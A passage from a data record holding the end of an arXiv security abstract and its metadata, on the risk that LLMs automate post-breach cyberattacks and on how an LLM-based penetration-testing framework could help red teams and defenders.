transform organizational attacks from\nrare, expert-led events to frequent, automated operations requiring no\nexpertise and executed at automation speed and scale. This risks fundamentally\nchanging global computer security and correspondingly causing substantial\neconomic impacts, and a goal of this work is to better understand these risks\nnow so we can better prepare for these inevitable ever-more-capable LLMs on the\nhorizon. On the immediate impact side, this research serves three purposes.\nFirst, an automated LLM-based, post-breach exploitation framework can help\nanalysts quickly test and continually improve their organization\'s network\nsecurity posture against previously unseen attacks. Second, an LLM-based\npenetration test system can extend the effectiveness of red teams with a\nlimited number of human analysts. Finally, this research can help defensive\nsystems and teams learn to detect novel attack behaviors preemptively before\ntheir use in the wild....', 'entry_id': 'http://arxiv.org/abs/2403.01038v1', 'published_first_time': '2024-03-02', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.AI'], 'links': ['http://arxiv.org/abs/2403.01038v1', 'http://arxiv.org/pdf/2403.01038v1']}]",True
